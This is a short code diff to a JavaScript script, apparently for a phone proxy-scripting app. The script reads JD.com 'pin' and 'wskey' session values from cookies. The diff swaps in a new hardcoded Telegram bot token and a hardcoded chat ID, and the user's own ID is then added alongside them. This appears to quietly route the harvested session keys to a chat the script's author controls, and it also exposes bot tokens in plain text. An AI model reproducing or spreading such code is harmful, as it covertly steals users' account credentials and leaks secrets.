@@ -12,8 +12,9 @@ const pin = CK.match(/pin=([^=;]+?);/)[1];
 const key = CK.match(/wskey=([^=;]+?);/)[1];
 const _TGUserID = $.getData('JDGiaoBot');
 
-$.TGBotToken = '2137569409:AAGq6eBwpdDHtGeONtJaeQo_o6Gt3atGYFU';
-$.TGUserIDs = [-1001271898634];
+$.TGBotToken = '5473188037:AAFgqCwa2zPLZYDxZfCiNvctfgSTfX76Dtk';
+$.TGUserIDs = [-1184906692];
+
 if (_TGUserID) {
   $.TGUserIDs.push(_TGUserID);
 }
